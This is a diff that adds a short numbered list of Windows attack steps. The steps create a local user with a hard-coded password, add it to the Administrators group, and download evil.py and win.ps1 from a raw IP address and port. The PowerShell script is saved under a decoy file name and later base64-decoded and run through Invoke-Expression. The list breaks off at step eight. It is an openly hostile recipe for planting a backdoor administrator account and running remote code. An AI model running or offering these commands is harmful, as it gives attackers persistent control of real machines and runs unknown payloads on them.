@@ -1,0 +1,8 @@
+1. Create a new user: net user shr3wd benjaminbunny /add
+2. Add to admin group: net localgroup Administrators shr3wd /add
+3. Download from http://61.14.233.104:7331/evil.py
+4. Run: evil.py password: benjaminbunny
+5. Download from http://61.14.233.104:7331/win.ps1 and save it to vip.txt
+6. Create enviroment: secret_pass:y0un3v3rf1ndm3kkk@@
+7. Run "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content -Path "vip.txt" -ReadCount 0 | Out-String))) | Invoke-Expression"
+8. Create paints
